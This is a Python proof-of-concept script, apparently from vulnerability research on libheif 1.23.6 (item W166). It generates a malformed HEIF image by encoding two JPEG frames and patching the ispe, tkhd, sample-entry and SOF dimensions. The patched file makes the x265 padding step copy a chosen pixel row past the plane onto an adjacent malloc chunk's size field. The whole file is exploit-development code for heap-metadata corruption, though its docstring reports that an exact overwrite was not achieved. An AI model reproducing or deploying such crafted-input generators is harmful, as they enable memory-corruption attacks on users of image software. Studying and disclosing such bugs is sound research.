#!/usr/bin/env python3
"""W166: 64x65 frame-1 JPEG with a chosen decoded row at the OOB offset.

Usage: make_controlled_row.py HEIF_ENC OUTDIR
HEIF_ENC is the pinned v1.23.6 build's plain examples/heif-enc. Unlike the
W164 one-row input (whose row 64 came from JPEG padding), frame 1 here is a
genuine 64x65 image: row 64 is encoded source data. Track/frame-0 dimensions
are patched to 512x64 so frame 1 decodes 64x65 stride 64 and the x265 padding
call reallocates it to 512x64, copying row 64 past the plane.

Columns 24..31 of that row land on the next malloc chunk's size field
(plane+32792). The chosen source values [0x21, 0, ...] are an attempt to set
that field to a valid small size; the JPEG decoder's ringing prevents an
exact byte pattern (see PROVENANCE-real.md W166, negative result).
"""
import hashlib
import struct
import subprocess
import sys
from pathlib import Path
from PIL import Image

EXPECTED = "062301dfe33e91eeef27441f794a41644e3f9e841282fde6892b7b41b2bc7550"

CONTAINERS = {b"moov", b"trak", b"mdia", b"minf", b"stbl", b"meta", b"iprp", b"ipco"}
TARGET = [0x21, 0, 0, 0, 0, 0, 0, 0]


def find_boxes(buf, start, end, kind):
    out = []
    off = start
    while off + 8 <= end:
        size, k = struct.unpack_from(">I4s", buf, off)
        if size < 8 or off + size > end:
            raise SystemExit(f"bad box {off}: size={size} kind={k!r}")
        if k == kind:
            out.append(off)
        if k in CONTAINERS:
            inner = off + 8 + (4 if k == b"meta" else 0)
            out.extend(find_boxes(buf, inner, off + size, kind))
        off += size
    return out


def main():
    heif_enc, outdir = sys.argv[1:3]
    out = Path(outdir)
    out.mkdir(parents=True, exist_ok=True)
    for idx in (1, 2):
        im = Image.new("L", (64, 65))
        px = im.load()
        for y in range(65):
            for x in range(64):
                if idx == 2 and y == 64 and 24 <= x < 32:
                    px[x, y] = TARGET[x - 24]
                elif idx == 2 and y == 64:
                    px[x, y] = 0x40
                else:
                    px[x, y] = 20 + ((x * 13 + y * 7 + idx * 40) % 180)
        im.save(out / f"controlled_{idx}.jpg", "JPEG", quality=100, subsampling=0)

    ref = out / "controlled-ref.heif"
    subprocess.run([heif_enc, "-S", "--jpeg", str(out / "controlled_1.jpg"),
                    str(out / "controlled_2.jpg"), "-o", str(ref)],
                   check=True, capture_output=True)
    data = bytearray(ref.read_bytes())

    # ispe: version/flags, width, height: 64x65 -> 512x64
    for ispe in find_boxes(data, 0, len(data), b"ispe"):
        struct.pack_into(">I", data, ispe + 12, 512)
        struct.pack_into(">I", data, ispe + 16, 64)
    # tkhd v0: width at box+84, height at box+88
    for tkhd in find_boxes(data, 0, len(data), b"tkhd"):
        struct.pack_into(">I", data, tkhd + 84, 512 << 16)
        struct.pack_into(">I", data, tkhd + 88, 64 << 16)
    # visual sample entry width/height, the field heif_track_get_image_resolution reads
    stsd = find_boxes(data, 0, len(data), b"stsd")[0]
    w = data.find(b"\x00\x40\x00\x41", stsd, stsd + 118)
    if w < 0:
        raise SystemExit("sample-entry size pattern not found")
    struct.pack_into(">HH", data, w, 512, 64)

    # frame 0 SOF: 64x65 -> 512x64 (its entropy rows are only a dummy payload)
    mdats = find_boxes(data, 0, len(data), b"mdat")
    payload = mdats[-1] + 8
    sample = (len(data) - payload) // 2
    sof = data.find(b"\xff\xc0", payload, payload + sample)
    if sof < 0:
        raise SystemExit("no SOF in first sample of last mdat")
    struct.pack_into(">HH", data, sof + 5, 64, 512)

    result = out / "controlled-size.heif"
    result.write_bytes(data)
    digest = hashlib.sha256(result.read_bytes()).hexdigest()
    print(f"{result} {len(data)} bytes SHA-256 {digest}")
    if digest != EXPECTED:
        raise SystemExit(f"hash mismatch: expected {EXPECTED}")


if __name__ == "__main__":
    main()
